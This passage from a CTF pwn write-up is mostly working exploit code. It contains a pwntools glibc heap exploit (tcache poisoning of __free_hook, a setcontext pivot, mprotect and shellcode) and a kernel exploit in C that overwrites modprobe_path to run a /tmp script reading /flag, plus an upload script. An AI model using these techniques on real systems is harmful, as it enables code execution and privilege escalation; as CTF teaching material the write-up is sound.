0x0000000000023b6c : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000002604b : pop rsp ; pop r13 ; pop r14 ; ret
0x00000000000ef1c5 : pop rsp ; pop r13 ; pop r15 ; ret
0x00000000000460a5 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000025bcc : pop rsp ; pop r13 ; ret
0x000000000008e261 : pop rsp ; pop r14 ; ret
0x000000000012cfae : pop rsp ; pop rbp ; ret
0x000000000002f73a : pop rsp ; ret
0x0000000000099050 : pop rsp ; ret 0xffff
0x0000000000022679 : ret
'''

# orw = flat([
#     rax,2,rdi,heap_base+0x290+0x10,rsi,0,syscall_ret,rdi,3,rdx_r12,0x100,0,rsi,heap_base+0x290+0x20,read_addr,rdi,1,write_addr
# ])



add(0x430) # 2
edit(0,'u'*0x10)
show(0)
ru('u'*0x10)
heap_leak = uu64(rc(6))
heap_base = heap_leak - 0x290
lg('heap_leak',heap_leak)
lg('heap_base',heap_base)

mmp = flat([
    rdi,((heap_base + 0xD00)>>12)<<12,rsi,0x2000,rdx_r12,7,0,libc.sym.mprotect,rdi,0,rsi,heap_base + 0xD00,rdx_r12,0x1000,0,read_addr,jmp_rsi
])

edit(0,p64(libc_base+0x1ecfd0)*2)
add(0x420) # 3 0
add(0x20) # 4
dele(1)
dele(4)
edit(4,p64(libc.sym.__free_hook))
add(0x20) # 5
add(0x20,p64(magic)) # 6

fuck = SigreturnFrame()
fuck.rsp = heap_base + 0x700
fuck.rip = ret

edit(0,p64(0) + p64(heap_base + 0x290+0x10) + p64(0)*2 + p64(libc.sym.setcontext+61)+str(fuck)[0x28:])# mov rdx,QWORD PTR [rdi+0x8];mov QWORD PTR [rsp],rax;call   QWORD PTR [rdx+0x20]
edit(2,mmp)

dele(0)
sl(asm(shellcraft.cat('/flag')))

p.interactive()
```

### Kernel

A small kernel challenge with an arbitrary-address write.

![image-20220620114038284](https://res.cloudinary.com/sycamore/image/upload/v1792696626/Typora/2022/06/b7beb5832ebd13347106f73a5efab408.png)

I redirected **modprobe_path** to my own shell script, which copied the file and changed its permissions so I could read the flag.

Source for the flag-reading program:

**exp.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>



size_t path = 0xffffffff81e48240;

int main(int argc, char ** argv)
{
    int fd1 = open("/dev/chardev0", 2);
    if(fd1 <0)
    {
        printf("\033[31m\033[1m[x] Failed to open the babydev1!\033[0m\n");
        exit(-1);
    }
    // ffffffff81e48240 D modprobe_path
    // ffffffffc0000000 t chardev_ioctl        [www]
    // 0xffffffffc000001e
    size_t ar[2] = {path,0x612f706d742f};
    ioctl(fd1,0x80084700,ar);

    system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/a");
    system("chmod +x /tmp/a");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/uuu");
    system("chmod +x /tmp/uuu");
    system("/tmp/uuu");
    system("cat /tmp/flag");
}
```

**Build script**

```bash
musl-gcc exp.c -static -O2 -o exp # 这里用了 musl 编译缩小 exp 大小
strip exp
```

**Script used to upload the program**

**cc.py**

```python
from pwn import *
import time, os
context.log_level = "debug"

p = remote('101.133.134.12',10002)
os.system("tar -czvf exp.tar.gz ./exp")
os.system("base64 exp.tar.gz > b64_exp")

f = open("./b64_exp", "r")

p.sendline()
p.recvuntil("/ $")
p.sendline("echo '' > b64_exp;")

count = 1
while True:
    print('now line: ' + str(count))
    line = f.readline().replace("\n","")
    if len(line)<=0:
        break
    cmd = b"echo '" + line.encode() + b"' >> b64_exp;"
    p.sendline(cmd)
    p.recvuntil("/ $")
    count += 1
f.close()

p.sendline("base64 -d b64_exp > exp.tar.gz;")
p.sendline("tar -xzvf exp.tar.gz")
p.sendline("chmod +x ./exp;")
p.sendline("./exp")

p.interactive()
```

The screenshot shows the **flag** being read successfully.

![image-20220620113858776](https://res.cloudinary.com/sycamore/image/upload/v1792696631/Typora/2022/06/ec5895eb753ca0112ace1beac830a20a.png)

### Reference Link

[【NOTES.0x03】Linux Kernel Pwn II：Basic Exploit to Kernel Pwn in CTF - arttnba3's blog](https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/)

[Linux Kernel Exploitation Technique: Overwriting modprobe_path - Midas](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/)
